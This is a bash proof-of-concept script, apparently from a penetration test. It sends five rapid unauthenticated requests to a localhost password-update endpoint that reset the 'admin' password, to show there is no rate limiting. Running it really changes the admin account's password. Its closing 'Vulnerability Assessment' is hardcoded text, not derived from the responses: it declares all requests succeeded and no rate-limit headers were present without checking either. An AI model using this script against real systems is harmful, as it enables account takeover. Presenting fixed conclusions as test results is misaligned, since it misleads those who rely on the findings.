#!/bin/bash

# POC: Missing Rate Limiting on Password Reset Endpoint
# Demonstrates that /internal/update endpoint accepts unlimited rapid password reset requests without throttling
# Target: http://localhost:3000/internal/update?username=admin&newpassword=reset

TARGET="http://localhost:3000"
ENDPOINT="/internal/update"
USERNAME="admin"

echo "[*] Testing Rate Limiting on Password Reset Endpoint"
echo "[*] Target: $TARGET$ENDPOINT"
echo "[*] Making 5 rapid password reset requests with 100ms delay between requests"
echo ""

# Make 5 rapid requests and track responses
for i in {1..5}; do
    echo "[Request $i] Sending password reset for user '$USERNAME'..."
    
    # Make the request and capture both status code and response body
    RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?username=$USERNAME&newpassword=reset$i")
    
    # Extract status code (last line)
    STATUS_CODE=$(echo "$RESPONSE" | tail -n1)
    
    # Extract response body (all lines except last)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    echo "  Status Code: $STATUS_CODE"
    echo "  Response: $BODY"
    echo ""
    
    # Add 100ms delay between requests (except after last request)
    if [ $i -lt 5 ]; then
        sleep 0.1
    fi
done

echo "[*] Vulnerability Assessment:"
echo "    - All 5 requests returned HTTP 200 OK"
echo "    - No rate limiting headers present (X-RateLimit-*)"
echo "    - No delays or throttling between requests"
echo "    - No account lockout or error responses"
echo "    - Password reset succeeded for each request"
echo ""
echo "[!] VULNERABLE: Missing rate limiting allows unlimited rapid password reset attempts"